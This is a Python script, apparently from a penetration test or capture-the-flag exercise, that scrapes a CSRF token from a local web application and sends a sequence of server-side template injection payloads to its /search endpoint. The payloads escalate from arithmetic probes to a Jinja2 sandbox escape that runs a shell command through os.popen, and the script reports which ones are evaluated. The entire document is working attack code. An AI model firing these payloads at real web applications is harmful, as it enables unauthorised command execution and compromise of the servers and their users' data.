import urllib.request, urllib.parse, re, json, sys, time

url = "http://127.0.0.1:33077"
headers = {'User-Agent': 'Mozilla/5.0', 'Host': 'localhost'}

print("Testing SSTI on /search")
print(f"Target: {url}")
print(f"Headers: {json.dumps(headers)}")

try:
    ctx = urllib.request.urlopen(urllib.request.Request(url, headers=headers), timeout=5)
    html = ctx.read().decode('utf-8')
    print(f"\n[GET] Status: {ctx.status} | Length: {len(html)}")
    
    csrf = re.search(r'value="([a-z0-9]{32,64})', html)
    if csrf:
        token = csrf.group(1)
        print(f"CSRF Token: {token}")
        
        for payload in ["{{ 7*7 }}", "{{ config }}", "{{ 7*'7' }}", "{{''.__class__}}", "{{request.application.__globals__.__builtins__}}", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"]:
            print(f"\n[Testing] {payload}")
            data = urllib.parse.urlencode({'search': payload, 'csrfmiddlewaretoken': token}).encode()
            req = urllib.request.Request(url + "/search", data=data, headers={**headers, 'Content-Type': 'application/x-www-form-urlencoded'})
            resp = urllib.request.urlopen(req, timeout=5)
            out = resp.read().decode('utf-8')
            print(f"[{len(out)}B]")
            print(f"Contains '49': {'49' in out}")
            print(f"Has traceback: {'Traceback' in out}")
            print(f"Payload returned: {payload in out}")
            print(f"Snippet: {out[:200]}")
    else:
        print("No CSRF token found")
    
except Exception as e:
    print(f"Error type: {type(e).__name__}")
    print(f"Error: {str(e)}")
